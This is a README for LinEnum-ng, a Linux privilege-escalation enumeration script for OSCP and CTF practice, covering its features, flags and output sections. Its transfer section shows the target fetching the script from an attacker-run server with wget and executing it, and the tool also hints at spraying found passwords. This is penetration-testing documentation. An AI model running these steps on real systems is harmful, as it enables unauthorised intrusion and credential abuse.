# LinEnum-ng

> A focused, stable, OSCP-oriented Linux privilege escalation enumeration script.

<p align="center">
  <img src="https://img.shields.io/badge/version-1.0.0-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/target-Linux-orange?style=for-the-badge&logo=linux&logoColor=white" />
</p>

---

## Why LinEnum-ng?

There are two well-known tools in this space: the original **LinEnum** and **linPEAS**. LinEnum-ng was built because neither fully hits the mark for OSCP-style engagements.

### vs. LinEnum ([@rebootuser](https://github.com/rebootuser/LinEnum))

LinEnum is the classic. It works, it's simple, and it's been around forever. But it's also showing its age:

| | LinEnum | LinEnum-ng |
|---|---|---|
| Kernel CVE checks | ❌ None | ✅ PwnKit, Dirty Pipe, Dirty COW, Baron Samedit, eBPF, sudo CVEs |
| SUID exploitation hints | ❌ Lists only | ✅ Cross-references full GTFOBins list with explanation |
| Container detection | ⚠️ Docker only | ✅ Docker, LXC, **Kubernetes** (with token/API checks) |
| Sudo with password | ⚠️ Interactive prompt | ✅ Pass via `-p` flag, non-interactive |
| Username hunting | ❌ | ✅ `-u` flag: finds files by name and content |
| Group privesc | ⚠️ Basic | ✅ Docker, LXD, disk, adm, shadow, video — each with exploitation steps |
| Color output | ❌ | ✅ linPEAS-style color scheme |
| Password spray hint | ❌ | ✅ Reminds you to try found passwords against all users |

### vs. linPEAS

linPEAS is powerful and actively maintained — arguably the most feature-rich Linux enumeration script available. LinEnum-ng doesn't try to replace it. The reason this script exists is more specific:

**linPEAS changes too much between versions.**

If you've done enough OSCP boxes, you've hit this: a specific linPEAS version finds the vector immediately, then you update and the next version misses it entirely (happend to me on the exam), output restructured, noise level changed. 

LinEnum-ng is intentionally stable and scoped. It covers exactly what the OSCP exam environment tends to test:

- Kernel exploits (with version-specific CVE matching)
- Sudo misconfigurations (passwordless and with credentials)
- SUID/SGID binaries cross-referenced against GTFOBins
- Cron job weaknesses
- Writable paths and service files
- Credential hunting in configs, history files, and environment
- Container escape vectors
- Group-based privilege escalation (docker, lxd, disk, adm, shadow)

The output is clean, color-coded, and structured so you can triage top-to-bottom quickly — no information overload, no hunting through walls of green text.

---

## Features

- **Kernel CVE detection with links** — PwnKit (CVE-2021-4034), Dirty Pipe (CVE-2022-0847), Dirty COW (CVE-2016-5195), Baron Samedit (CVE-2021-3156), eBPF (CVE-2017-16995), sudo CVEs (CVE-2019-18634, CVE-2025-32463, and more)
- **GTFOBins-aware sudo/SUID checks** — flags exploitable binaries automatically
- **Kubernetes pod detection** — service account token readability, API server access test, namespace, env vars
- **Docker & LXD group privesc** — complete exploitation steps included in output
- **Password-aware sudo check** — pass `-p` to test sudo with credentials non-interactively
- **Username file hunt** — pass `-u` to scan the entire filesystem for files related to a target user
- **Password spray reminder** — if you found a password during enumeration, the script reminds you to try it against all other users
- **linPEAS-style color output** — red for critical, yellow for interesting, green for clean

---

## Usage

```bash
./linenum-ng.sh [OPTIONS]
```

| Option | Description |
|--------|-------------|
| `-p PASSWORD` | Supply a known password. Used for authenticated `sudo -l` and credential checks. |
| `-u USERNAME` | Target a username. Hunts files named after or containing that user across the filesystem. |
| `-h, --help` | Show help and usage examples. |

### Examples

```bash
# Basic run — no credentials
./linenum-ng.sh

# Test sudo access with a found password
./linenum-ng.sh -p 'Summer2024!'

# Hunt for files related to a specific user
./linenum-ng.sh -u john

# Full run — password check + username hunt
./linenum-ng.sh -p 'Summer2024!' -u john
```

---

## Output Structure

The script runs top-to-bottom through these sections:

1. Basic System Info & Kernel Version
2. **Kernel Exploit Vulnerability Check** ← start here on older kernels
3. User / Group Information
4. Sudo & SUID/SGID Enumeration
5. Environmental Information
6. Scheduled Tasks (Cron & Systemd Timers)
7. Services & Processes
8. Network Information
9. Database Enumeration
10. Web Server Enumeration
11. Shell & Profile Files
12. SSH Keys & Configuration
13. Writable Locations
14. Interesting Files & Password Hunting
15. Container & Group Privilege Escalation (Docker, LXD, disk, adm, shadow)
16. System Configuration Files
17. Username Hunt (if `-u` supplied)
18. **Final Summary & Reminders**

---

## Color Key

| Color | Meaning |
|-------|---------|
| **Red text on yellow background** | Confirmed vulnerability or critical misconfiguration — act on this |
| **Bright red** | Notable finding — group membership, sensitive file, writable path |
| 🟡 Yellow | Section headers and informational prompts |
| 🟢 Green | Clean / not vulnerable / check passed |
| 🔵 Cyan | Raw command output and data values |
| 🟣 Magenta | Exploitation steps, links, and remediation hints |

---

## Transferring to Target

```bash
# Python HTTP server
python3 -m http.server 8080

# On target
wget http://<your-ip>:8080/linenum-ng.sh -O /tmp/linenum-ng.sh
chmod +x /tmp/linenum-ng.sh
/tmp/linenum-ng.sh
```

### CTF Tip — No HTTP Server? Use a Heredoc

Copying and pasting a large script directly into a terminal can hang or crash CTF machines due to buffer overload. Instead, wrap it in a heredoc — this lets the shell receive the content safely as a stream rather than a raw paste flood:

```bash
cat > LinEnum-ng.sh << 'EOF'
<paste the full script content here>
EOF
chmod +x LinEnum-ng.sh && ./LinEnum-ng.sh
```

The single quotes around `'EOF'` are important — they prevent the shell from trying to expand variables inside the script while it's being written to disk.

---

## Compared At a Glance

| Feature | LinEnum | linPEAS | LinEnum-ng |
|---------|---------|---------|------------|
| Kernel CVE matching | ❌ | ✅ | ✅ |
| GTFOBins SUID/sudo cross-ref | ❌ | ✅ | ✅ |
| Kubernetes detection | ❌ | ✅ | ✅ |
| Non-interactive `-p` flag | ⚠️ | ✅ | ✅ |
| Username filesystem hunt | ❌ | ❌ | ✅ |
| Password spray reminder & hints | ❌ | ❌ | ✅ |
| Color output | ❌ | ✅ | ✅ |
| Version stability | ✅ | ⚠️ Changes frequently | ✅ |
| OSCP-scoped, no noise | ✅ | ⚠️ Very verbose | ✅ |

---

## ⭐ Support

If LinEnum-ng helped you pop a shell, pass the OSCP, or saved you time on a CTF — consider leaving a star. It helps others find the tool and keeps the project going.

*LinEnum-ng by [Strikoder](https://github.com/strikoder)*